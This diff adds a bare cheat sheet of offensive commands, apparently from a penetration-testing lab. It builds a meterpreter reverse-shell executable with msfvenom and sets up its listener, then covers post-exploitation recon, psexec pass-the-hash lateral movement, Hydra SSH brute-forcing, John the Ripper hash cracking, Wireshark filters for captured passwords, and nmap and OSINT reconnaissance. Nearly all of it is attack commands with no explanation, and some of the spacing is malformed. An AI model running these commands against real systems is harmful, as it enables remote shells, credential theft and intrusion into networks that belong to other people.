@@ -1,0 +1,52 @@
+msfconsole 
+search multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST 192.168.122.152 
+exploit 
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.152 LPORT=4444 -f exe -o aaa.exe 
+
+ifconfig
+arp
+
+
+use post/multi/recon/local_exploit_suggester 
+Set SESSION 1 
+run
+msf6 > use post/multi/gather/ping_sweep
+msf6 post(ping_sweep) > set RHOSTS 192.168.10.0/24
+msf6 post(ping_sweep) > set SESSION 1
+msf6 post(ping_sweep) > run
+
+
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 post(local_exploit_suggester) > set SESSION 1
+
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(psexec) > set RHOSTS <Target2_IP>
+msf6 exploit(psexec) > set SMBUser admin_backup
+msf6 exploit(psexec) > set SMBPass <LM_HASH>:<NTLM_HASH>
+msf6 exploit(psexec) > run
+
+msf6 > use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(tcp) > set RHOSTS 192.168.10.x
+msf6 auxiliary(tcp) > set PORTS 1-1024
+msf6 auxiliary(tcp) > set THREADS 10
+msf6 auxiliary(tcp) > run
+
+john--show hashes.txt
+john--show--format=md5crypt hashes.txt
+hydra-L userlist.txt-P passlist.txt-t 4 ssh://<TARGET_IP>
+hydra-L userlist.txt-P passlist.txt-t 4-w 3-f ssh://ip
+
+http.request.method == "POST"
+http.request.method == "POST" && http contains "password"
+
+
+nmap -sV -O -A -T4 192.168.1.1
+whois dig whatweb -v -a 3 example.com
+nslookup example.com
+ nslookup -type=mx example.com
+ Wafw00f & Curl
+ theHarvester -d example.com -b all
+ whatweb web -v -a 3 example.com
